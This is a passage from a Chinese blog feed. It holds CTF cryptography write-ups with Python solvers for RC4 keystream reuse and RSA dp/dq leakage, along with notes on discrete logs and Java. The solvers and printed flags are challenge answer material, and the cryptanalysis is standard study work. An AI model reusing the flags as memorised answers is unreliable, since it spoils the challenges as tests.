class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Encrypt</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, plain)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> cnt</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        self.rc4 = RC4(Key)</span><br><span class="line">        self.testRC4(plain)</span><br><span class="line">        flag_file = Image.open(<span class="string">r"flag.png"</span>)</span><br><span class="line">        img = array(flag_file)</span><br><span class="line">        self.enc(img)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">testRC4</span><span class="params">(self, plain)</span>:</span></span><br><span class="line">        ciphertext = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> plain:</span><br><span class="line">            ciphertext = (ciphertext &lt;&lt; <span class="number">8</span>)+ord(i) ^ self.rc4.next()</span><br><span class="line">        print(<span class="string">"ciphertext&#123;&#125; = &#123;&#125;"</span>.format(cnt, ciphertext))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(self, img)</span>:</span></span><br><span class="line">        a, b, _ = img.shape</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, a):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, b):</span><br><span class="line">                pixel = img[x, y]</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">                    pixel[i] = pixel[i] ^ self.rc4.next()</span><br><span class="line">                img[x][y] = pixel</span><br><span class="line">        enc = Image.fromarray(img)</span><br><span class="line">        enc.save(<span class="string">"enc&#123;&#125;.png"</span>.format(cnt))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Encrypt(Plaintext1)</span><br><span class="line">Encrypt(Plaintext2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ciphertext1 = 12078640933356268898100798377710191641</span></span><br><span class="line"><span class="comment"># ciphertext2 = 79124196547094980420644350061749775</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li><p>先还原出密钥流的前几位，发现cip1比cip2多出来一位</p></li><li><p>enc1[0]=img1[0]^keystream[1]</p><p>enc2[0]=img2[0]^keystream[0]</p><p>keystream[1]=enc1[0]^ enc2[0] ^ keystream[0]</p><p>推算出密钥流的下一位，其中keystream[0]就是多出来的一位密钥</p></li><li><p>反复横跳，求解出全部密钥流进行解密</p></li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment">#推出密钥流前几位</span></span><br><span class="line">ciphertext1 = <span class="number">12078640933356268898100798377710191641</span></span><br><span class="line">ciphertext2 = <span class="number">79124196547094980420644350061749775</span></span><br><span class="line">cipher1 = bin(ciphertext1)[<span class="number">2</span>:].zfill(<span class="number">128</span>)</span><br><span class="line">cipher2 = bin(ciphertext2)[<span class="number">2</span>:].zfill(<span class="number">120</span>)</span><br><span class="line">c1 = [int(cipher1[i:i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(cipher1), <span class="number">8</span>)]</span><br><span class="line">c2 = [int(cipher2[i:i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(cipher2), <span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">Plaintext1 = <span class="string">"RC4IsInteresting"</span></span><br><span class="line">Plaintext2 = <span class="string">"ThisIsAEasyGame"</span></span><br><span class="line"></span><br><span class="line">key1 = []</span><br><span class="line">key2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c1)):</span><br><span class="line">    key1.append(c1[i] ^ ord(Plaintext1[i]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c2)):</span><br><span class="line">    key2.append(c2[i] ^ ord(Plaintext2[i]))</span><br><span class="line">keystream=[<span class="number">126</span>]</span><br><span class="line">f1 = Image.open(<span class="string">r"enc1.png"</span>)</span><br><span class="line">img1 = array(f1)</span><br><span class="line">f2 = Image.open(<span class="string">r"enc2.png"</span>)</span><br><span class="line">img2 = array(f2)</span><br><span class="line">a, b, _ = img1.shape</span><br><span class="line"><span class="comment">#推出解密需要的全部密钥流</span></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, b):</span><br><span class="line">        pixel1=img1[x, y]</span><br><span class="line">        pixel2=img2[x,y]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">            keystream.append(pixel1[i]^pixel2[i]^keystream[k])</span><br><span class="line">            k+=<span class="number">1</span></span><br><span class="line"><span class="comment">#还原图片</span></span><br><span class="line">k=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, b):</span><br><span class="line">        pixel = img1[x, y]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">            pixel[i] = pixel[i] ^ keystream[k]</span><br><span class="line">            k+=<span class="number">1</span></span><br><span class="line">        img1[x][y] = pixel</span><br><span class="line">dec = Image.fromarray(img1)</span><br><span class="line">dec.save(<span class="string">"dec.png"</span>)</span><br></pre></td></tr></table></figure><h2 id="knapsack"><a href="#knapsack" class="headerlink" title="knapsack"></a>knapsack</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genKey</span><span class="params">(length)</span>:</span></span><br><span class="line">    A, B = getPrime(<span class="number">64</span>), getPrime(<span class="number">1025</span>)</span><br><span class="line"></span><br><span class="line">    Rn = getPrime(<span class="number">1024</span>)</span><br><span class="line">    key1 = [Rn//<span class="number">2</span>**i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length+<span class="number">1</span>)]</span><br><span class="line">    key2 = [i*A % B <span class="keyword">for</span> i <span class="keyword">in</span> key1] </span><br><span class="line">    <span class="keyword">return</span> key1,key2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text,key)</span>:</span></span><br><span class="line">    Sum=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">        Sum+=int(text[i])*key[i]</span><br><span class="line">    <span class="keyword">return</span> Sum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(Ciper,Key)</span>:</span></span><br><span class="line">    f1=open(<span class="string">"pub.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(Key)):</span><br><span class="line">        f1.write(str(Key[i])+<span class="string">'\n'</span>)</span><br><span class="line">    f2=open(<span class="string">"cip.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">    f2.write(hex(Ciper))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FLAG = bin(bytes_to_long(flag.encode()))[<span class="number">2</span>:]</span><br><span class="line">Key1,Key2 = genKey(len(FLAG))</span><br><span class="line">Ciper = encrypt(FLAG,Key1)</span><br><span class="line">save(Ciper,Key2)</span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>背包问题</li><li>Merkle–Hellman</li></ul><p><a href="https://wiki.x10sec.org/crypto/asymmetric/knapsack/knapsack/#merklehellman" target="_blank" rel="noopener">https://wiki.x10sec.org/crypto/asymmetric/knapsack/knapsack/#merklehellman</a></p><p>鸽了</p>]]></content>
    
    
    <categories>
      
      <category>crypto刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RC4</tag>
      
      <tag>knapsack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dp与dq泄露</title>
    <link href="/2020/05/19/dp/"/>
    <url>/2020/05/19/dp/</url>
    
    <content type="html"><![CDATA[<p>RSA中泄露dp/dq公式推导</p><a id="more"></a><p>学习出处：<a href="https://skysec.top/2018/08/25/RSA之拒绝套路-2/" target="_blank" rel="noopener">https://skysec.top/2018/08/25/RSA%E4%B9%8B%E6%8B%92%E7%BB%9D%E5%A5%97%E8%B7%AF-2/</a></p><p><a href="https://skysec.top/2018/08/24/RSA之拒绝套路(1" target="_blank" rel="noopener">https://skysec.top/2018/08/24/RSA%E4%B9%8B%E6%8B%92%E7%BB%9D%E5%A5%97%E8%B7%AF(1)/</a>/)</p><h2 id="已知dp-e-n"><a href="#已知dp-e-n" class="headerlink" title="已知dp e n"></a>已知dp e n</h2><h3 id="推导"><a href="#推导" class="headerlink" title="推导"></a>推导</h3><p>已知</p><p>dp ≡ d mod (p-1)</p><p>e <em> d ≡ 1 mod (p-1) </em> (q-1) ①</p><p>得 </p><p>e <em>  dp ≡ e </em> d mod (p-1) </p><p>=&gt; e <em> d = k1</em>(p-1) + e * dp</p><p>代入①式</p><p>e <em> dp + k1 </em> (p-1) = k2 <em> (p-1) </em> (q-1) + 1</p><p>e <em> dp = (p-1)</em>(k2(q-1) - k1) + 1</p><p>由于 dp &lt; p-1 =&gt;  e &gt; k2 * (q-1) - k1</p><p>设 x = k2 * (q-1) -k1</p><p>遍历(0,e) 若x 满足整除e * dp -1，且结果(p-1) + 1能整除n，则成功分解n</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="BUU-RSA2"><a href="#BUU-RSA2" class="headerlink" title="[BUU]RSA2"></a>[BUU]RSA2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br></pre></td></tr></table></figure><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,e+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (e*dp<span class="number">-1</span>)%x==<span class="number">0</span> <span class="keyword">and</span> n%((e*dp<span class="number">-1</span>)//x+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">        p=(e*dp<span class="number">-1</span>)//x+<span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">q=n//p </span><br><span class="line">d=inverse(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b'flag&#123;wow_leaking_dp_breaks_rsa?_98924743502&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="已知dp-dq-p-q"><a href="#已知dp-dq-p-q" class="headerlink" title="已知dp dq p q"></a>已知dp dq p q</h2><h3 id="推导-1"><a href="#推导-1" class="headerlink" title="推导"></a>推导</h3><p>由中国剩余定理可知，我们可以通过①②式联立求出m</p><p>m1 ≡ $c^d$ mod p ①</p><p>m2 ≡ $c^d$mod q ②</p><p>=&gt; m ≡$c^d$mod n </p><p>由①式$c^d$ = k * p + m1</p><p>代入②式  m2 = (k * p + m1) mod q</p><p>(m2 - m1) ≡ k*p mod q</p><p>因为gcd(p,q)=1</p><p>k ≡ (m2 - m1) * $p^{-1}$ mod q</p><p>再将结果代入 $c^d$ = k * p + m1</p><p>$c^d$ = ((m2 - m1) <em>  $p^{-1}$ mod q) </em> p + m1</p><p>=&gt;  m ≡ (((m2 - m1) <em> $p^{-1}$  mod q) </em> p + m1) mod n </p><p>求出m1,m2即可</p><p>dp ≡ d mod (p-1)</p><p>=&gt; d = k * (p-1) + dp</p><p>代入$c^d$ ≡ m1 mod p</p><p>$c^{k*(p-1)+dp}$ ≡ m1 mod p</p><p>由费马小定理(<strong>p是大素数，显然和c互素</strong>)</p><p>$c^{dp} $≡ m1 mod p</p><p>同理$c^{dp} $≡ m2 mod q</p><p>代入 m ≡ (((m2 - m1) <em>  $p^{-1}$ mod q) </em> p + m1) mod n  中即可求得m</p><p>（当然m也可以直接通过crt求得）</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="BUU-rsa2"><a href="#BUU-rsa2" class="headerlink" title="[BUU]rsa2"></a>[BUU]rsa2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br></pre></td></tr></table></figure><h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> solve_crt</span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">m1=pow(c,dp,p)</span><br><span class="line">m2=pow(c,dq,q)</span><br><span class="line">m=(solve_crt([m1,m2],[p,q]))</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#noxCTF&#123;W31c0m3_70_Ch1n470wn&#125;</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> dp泄露可以通过分解n，根据已知的e求解RSA</p><p>而dp,dq同时泄露时，即使不知道e,d，也可以通过p,q直接求出明文m</p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>求解DLP</title>
    <link href="/2020/05/17/DLP/"/>
    <url>/2020/05/17/DLP/</url>
    
    <content type="html"><![CDATA[<p>离散对数求解学习，但是鸽了TnT</p><a id="more"></a><p>最近学习了关于了求解离散对数的相关问题，还差很多没有学习，下次会补的会补的会补的</p><h2 id="BSGS-Baby-Step-Giant-step-方法"><a href="#BSGS-Baby-Step-Giant-step-方法" class="headerlink" title="BSGS(Baby-Step Giant-step)方法"></a>BSGS(Baby-Step Giant-step)方法</h2><blockquote><p>小步-大步算法是一个时间-内存平衡方法,它使用额外的存储来减少蛮力搜索的时间.———《深入浅出密码学》</p></blockquote><p>求解离散对数x=log~α~β，可以将其以如下形式表示：</p><p>​                                        <strong>x=x~g~m+x~b~ (0&lt;=x~g~,x~b~&lt;m)</strong></p><p>m通常为群的阶的平方根，即⌈√|G|⌉</p><p>​                                        <strong>β=α^xg*m+xb^</strong></p><p>​                                        <strong>β *(α^-m^)^xg^=α^xb^ </strong></p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DLP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>认清形势，建立信心[npuctf]</title>
    <link href="/2020/05/17/NPUCTFWP/"/>
    <url>/2020/05/17/NPUCTFWP/</url>
    
    <content type="html"><![CDATA[<p>DLP与扩展CRT</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">25</span>)</span><br><span class="line">e = <span class="comment"># Hidden</span></span><br><span class="line">q = getPrime(<span class="number">25</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(flag.strip(<span class="string">b"npuctf&#123;"</span>).strip(<span class="string">b"&#125;"</span>))</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(c)</span><br><span class="line">print(pow(<span class="number">2</span>, e, n))</span><br><span class="line">print(pow(<span class="number">4</span>, e, n))</span><br><span class="line">print(pow(<span class="number">8</span>, e, n))</span><br></pre></td></tr></table></figure><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul><li>求解DLP</li><li>扩展CRT</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>鸽了</p>]]></content>
    
    
    <categories>
      
      <category>crypto刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DLP</tag>
      
      <tag>扩展CRT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java学习(2)</title>
    <link href="/2020/05/05/java%E5%AD%A6%E4%B9%A02/"/>
    <url>/2020/05/05/java%E5%AD%A6%E4%B9%A02/</url>
    
    <content type="html"><![CDATA[<p>关于protected权限的子类访问方式</p><a id="more"></a><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>听老师讲课说到Object类的clone()方法，其声明方法是protected修饰的。protected修饰的可见性在本类，同包类，子类中皆可见。但子类clone()方法使用时，却不能直接调用Object类的clone()方法，而是需要进行重写,这个问题令我很迷茫。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object clone() throws CloneNotSupportedException&#123;</span><br><span class="line">              return super.clone();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="前置芝士"><a href="#前置芝士" class="headerlink" title="前置芝士"></a>前置芝士</h2><p>学习出处：<br><a href="https://blog.csdn.net/blacktal/article/details/81198579" target="_blank" rel="noopener">https://blog.csdn.net/blacktal/article/details/81198579</a><br><a href="https://blog.csdn.net/asahinokawa/article/details/80777302" target="_blank" rel="noopener">https://blog.csdn.net/asahinokawa/article/details/80777302</a><br>通过学习我认识到，protected修饰并不只是被同一包中的所有类和不同包中的子类访问那么简单。<br>直接总结一下，详细实例看出处</p><ol><li><p>子类可以通过继承获得不同包父类的protected权限成员变量和成员方法，在子类中可以直接访问</p></li><li><p>在子类中可以通过子类的对象访问父类的protected成员变量和方法</p></li><li><p>在子类中反而<strong>不能</strong>通过父类的对象实例访问父类的protected成员变量和方法</p></li><li><p>在子类中不能通过其他子类的对象访问父类的protected成员变量和方法</p></li><li><p>在与子类同包的其他类中不能通过子类的对象访问父类的protected成员变量和方法</p></li></ol><p>子类可以在自己这里直接调用父类protected修饰的成员变量和方法，但是若在别的类中使用<code>子类.clone()</code>，protected修饰的就不可见(同第5条)</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>所以为了能在其他类中调用clone()方法，必须通过<strong>在子类中重写把clone()方法的权限提升并且实现Cloneable接口</strong><br>在自定义子类A类体中调用Object的clone()方法的问题不再讨论，不能这么使用</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java学习(1)</title>
    <link href="/2020/05/05/java%E5%AD%A6%E4%B9%A01/"/>
    <url>/2020/05/05/java%E5%AD%A6%E4%B9%A01/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><p>今天老师留了一个作业：建立框架，在中央放置多行文本框（TextArea）,在南方放置一个面板(JPanel),并在上边放置两个按钮，按钮文本分别为确定和取消</p><a id="more"></a><h2 id="多行文本框"><a href="#多行文本框" class="headerlink" title="多行文本框"></a>多行文本框</h2><p>TextArea是一个AWT组件<br>JTextArea是一个swing组件<br>想要加一个多行文本框，就需要<code>new JTextArea()</code></p><h2 id="正确的代码"><a href="#正确的代码" class="headerlink" title="正确的代码"></a>正确的代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> pack2;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">JButton bt1,bt2;</span><br><span class="line">JTextArea textarea;</span><br><span class="line">JPanel j1;</span><br><span class="line">MyFrame()&#123;</span><br><span class="line"><span class="keyword">this</span>.setSize(<span class="number">400</span>, <span class="number">400</span>);</span><br><span class="line"><span class="keyword">this</span>.setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line"><span class="keyword">this</span>.setVisible(<span class="keyword">true</span>);</span><br><span class="line">bt1=<span class="keyword">new</span> JButton(<span class="string">"确定"</span>);</span><br><span class="line">bt2=<span class="keyword">new</span> JButton(<span class="string">"取消"</span>);</span><br><span class="line">textarea=<span class="keyword">new</span> JTextArea();</span><br><span class="line">j1=<span class="keyword">new</span> JPanel();</span><br><span class="line">j1.add(bt1);</span><br><span class="line">j1.add(bt2);</span><br><span class="line"><span class="keyword">this</span>.add(j1,BorderLayout.SOUTH);</span><br><span class="line"><span class="keyword">this</span>.add(textarea);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO 自动生成的方法存根</span></span><br><span class="line"><span class="keyword">new</span> MyFrame();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h2 id="adding-container’s-parent-to-itself"><a href="#adding-container’s-parent-to-itself" class="headerlink" title="adding container’s parent to itself"></a>adding container’s parent to itself</h2><p>错误的代码为<code>this.add(j1, BorderLayout.SOUTH)</code><br>补充一下，在类中还定义了<code>JPanel j1</code>，以及构造方法中的<code>j1=(JPanel)this.getContentPane()</code><br>其中由于内容面板是container类型的，所以需要类型强制转换<br>这是把容器自身添加到了自身内容造成的<br><strong>JDK1.5之前需要先获取内容面板，然后在内容面板上添加组件，从JDK1.5之后，可以直接使用<br>  <code>this.add()</code>添加组件，但组件依然被添加到内容面板上，而不是JFrame上</strong></p><h3 id="错在哪里"><a href="#错在哪里" class="headerlink" title="错在哪里"></a>错在哪里</h3><p>这里显然j1就是内容面板，我在这句话中把j1添加到了JFrame上。但实质是把j1加到了j1上</p><h3 id="纠错"><a href="#纠错" class="headerlink" title="纠错"></a>纠错</h3><p>这里我实际上是误解了题意，题目说的是放置一个面板，所以和获取内容面板没关系。<br>只需要<code>j1=new 